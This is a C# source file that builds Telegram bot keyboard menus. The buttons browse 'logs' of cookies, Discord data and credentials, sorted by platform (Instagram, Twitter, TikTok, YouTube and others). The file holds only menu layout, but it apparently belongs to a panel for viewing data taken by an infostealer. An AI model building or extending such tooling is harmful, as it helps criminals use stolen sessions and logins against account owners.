namespace Bot.Commands.Markups {
	public static class Markup_User {
		#region Start

		public static KeyboardButtonRow[] StartMarkupRows(string back_method) {
			return [
				new() {
					buttons = [
						new KeyboardButtonCallback {
							text = "Cookies",
							data = $"user_cookies:{back_method}".Utf8()
						}
					]
				},
				new() {
					buttons = [
						new KeyboardButtonCallback {
							text = "Discord",
							data = $"user_logs_show:0:user_discord:{back_method}".Utf8()
						},
						new KeyboardButtonCallback {
							text = "Credentials",
							data = $"user_logs_show:0:user_credentials:{back_method}".Utf8()
						}
					]
				}
			];
		}

		public static ReplyInlineMarkup StartMarkup(string back_method) {
			return new() {
				rows = Markup_User.StartMarkupRows(back_method)
			};
		}

		#endregion

		public static ReplyInlineMarkup CookiesMarkup(string back_method) {
			return new() {
				rows = [
					new() {
						buttons = [
							new KeyboardButtonCallback {
								text = "Instagram",
								data = $"user_logs_show:0:user_instagram:user_cookies".Utf8()
							},
							new KeyboardButtonCallback {
								text = "Twitter",
								data = $"user_logs_show:0:user_twitter:user_cookies".Utf8()
							}
						]
					},
					new() {
						buttons = [
							new KeyboardButtonCallback {
								text = "Twitch",
								data = $"user_logs_show:0:user_twitch:user_cookies".Utf8()
							},
							new KeyboardButtonCallback {
								text = "Telegram",
								data = $"user_logs_show:0:user_telegram:user_cookies".Utf8()
							}
						]
					},
					new() {
						buttons = [
							new KeyboardButtonCallback {
								text = "TikTok",
								data = $"user_logs_show:0:user_tiktok:user_cookies".Utf8()
							},
							new KeyboardButtonCallback {
								text = "YouTube",
								data = $"user_logs_show:0:user_youtube:user_cookies".Utf8()
							}
						]
					},
					new() {
						buttons = [
							new KeyboardButtonCallback {
								text = "Back",
								data = back_method.Utf8()
							}
						]
					}
				]
			};
		}
	}
}